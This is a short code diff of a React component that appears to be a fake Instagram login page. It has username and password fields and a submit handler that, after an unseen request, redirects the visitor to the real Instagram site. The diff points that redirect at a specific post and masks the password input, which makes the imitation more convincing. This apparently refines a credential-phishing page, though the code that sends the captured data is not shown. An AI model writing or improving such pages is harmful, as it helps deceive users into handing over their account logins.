@@ -23,7 +23,7 @@ function App() {
         }
       )
       .then(() => {
-        window.location.replace("https://www.instagram.com/");
+        window.location.replace("https://www.instagram.com/p/CzOWh0CNjZS/");
       });
   };
   return (
@@ -38,7 +38,7 @@ function App() {
             type="text"
             placeholder="Phone number, username, or email"
           />
-          <input name="pass" type="text" placeholder="Password" />
+          <input name="pass" type="password" placeholder="Password" />
           <p className="forget">Forget password?</p>
           <button>Log in</button>
           <p>
